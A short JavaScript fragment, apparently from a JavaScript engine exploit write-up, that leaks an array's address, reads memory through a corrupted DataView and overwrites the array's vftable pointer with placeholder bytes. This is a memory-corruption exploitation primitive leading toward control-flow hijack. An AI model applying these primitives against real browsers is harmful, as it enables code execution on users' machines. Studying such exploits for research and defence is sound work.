...
var [ myArr_lo, myArr_hi ] = get_addr(myArr)
var addr_myArr = new Long(myArr_lo, myArr_hi)
console.log("myArr(Array): 0x" + addr_myArr.toString(16))
...
var p = new Long(dv.getUint32.call(vector, 0, true), dv.getUint32.call(vector, 4, true));
console.log("0x" + p.toString(16));


// write myArr's vftable pointer with 0x42424242....
dv.setUint32.call(vector, 0, 0x45464748, true);
dv.setUint32.call(vector, 4, 0x41424344, true);
